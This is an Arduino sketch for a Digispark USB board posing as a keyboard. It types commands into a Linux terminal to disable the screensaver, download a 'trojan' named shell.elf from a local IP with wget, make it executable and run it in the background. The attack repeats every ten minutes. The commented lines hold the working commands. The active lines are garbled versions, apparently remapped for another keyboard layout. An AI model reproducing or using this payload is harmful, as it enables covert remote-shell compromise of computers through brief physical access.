#include "DigiKeyboard.h"

void setup()
{
pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
	DigiKeyboard.update();
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // start Terminal
	DigiKeyboard.delay(5000);
	// DigiKeyboard.println("gsettings set org.gnome.desktop.session idle-delay 0"); //set screensaver off
	DigiKeyboard.println("gsettings set org.gnome.desktop.session idle/delaz 0");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2000);
	// DigiKeyboard.println("wget -N -q http://192.168.0.180/shell.elf"); // download trojan
	DigiKeyboard.println("wget /N /q http>&&192.168.0.180&shell.elf");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2000);
	// DigiKeyboard.println("chmod +x shell.elf"); // set execute permissions
	DigiKeyboard.println("chmod ]x shell.elf");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2000);
	// DigiKeyboard.println("nohup ./shell.elf &"); // run trojan
	DigiKeyboard.println("nohup .&shell.elf ^");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2000);
	DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // close window
	DigiKeyboard.delay(1000);
	digitalWrite(1, HIGH); //turn on led when program finishes
	DigiKeyboard.delay(2000);
	digitalWrite(1, LOW);
	// run again after 10 min (600000), 30 min (1800000), 60 min (3600000)
	DigiKeyboard.delay(600000);
}